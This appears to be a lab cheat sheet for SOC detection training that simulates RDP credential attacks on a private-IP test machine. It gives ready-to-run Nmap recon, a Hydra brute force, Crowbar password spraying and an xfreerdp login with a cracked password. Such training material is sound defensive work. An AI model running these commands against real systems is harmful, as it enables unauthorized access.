# Kali Linux Adversary Simulation Commands

> **Disclaimer:** These commands were executed strictly inside an isolated educational lab environment on authorized target virtual machines for detection verification and SOC defensive training.

---

## 1. Network Reconnaissance & Port Scanning

### Nmap Port Scan for RDP (TCP 3389)
```bash
# Verify target availability and identify Remote Desktop service version
nmap -sV -p 3389 192.168.10.100
```
- **Explanation:** Checks if TCP port 3389 is open and probes the service to confirm whether RDP / Microsoft Terminal Services is running.

### Detailed Nmap Script Scan
```bash
# Enforce Nmap RDP vulnerability and encryption check
nmap --script "rdp-enum-encryption or rdp-ntlm-info" -p 3389 192.168.10.100
```
- **Explanation:** Gathers NTLM domain info, NetBIOS computer name, and supported encryption levels prior to launching brute force.

---

## 2. Password Dictionary Preparation

```bash
# Locate and decompress the standard RockYou wordlist
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Extract a focused custom password list for test simulation (top 100 entries)
head -n 100 /usr/share/wordlists/rockyou.txt > /tmp/passwords.txt

# Append known lab password to the end of the wordlist to test successful compromise detection
echo "Summer2026!" >> /tmp/passwords.txt
```

---

## 3. RDP Brute Force Execution

### Attack 1: Targeted User Brute Force with Hydra
```bash
# Launch multi-threaded dictionary attack against user 'Administrator'
hydra -l Administrator -P /tmp/passwords.txt rdp://192.168.10.100 -s 3389 -t 4 -V -W 3
```
- **Flags Breakdown:**
  - `-l Administrator`: Target username.
  - `-P /tmp/passwords.txt`: Path to the password wordlist.
  - `rdp://192.168.10.100`: Target URL and protocol specification.
  - `-s 3389`: Target port.
  - `-t 4`: 4 concurrent threads (avoids crashing older RDP service).
  - `-V`: Verbose mode (displays every attempted credential pair).
  - `-W 3`: Wait time (3 seconds) between connection drops.

### Attack 2: User Enumeration & Password Spraying with Crowbar
```bash
# Spray a common password across multiple discovered usernames
crowbar -b rdp -s 192.168.10.100/32 -u user_list.txt -c "Password123!"
```

---

## 4. Post-Attack Validation (Adversary Access Verification)

```bash
# Test remote desktop access using valid discovered credentials
xfreerdp /u:Administrator /p:'Summer2026!' /v:192.168.10.100 /cert:ignore
```
- **Explanation:** Launches an interactive RDP session to verify successful lateral movement / initial access, generating Event ID `4624` (Logon Type 10) in the SOC SIEM.
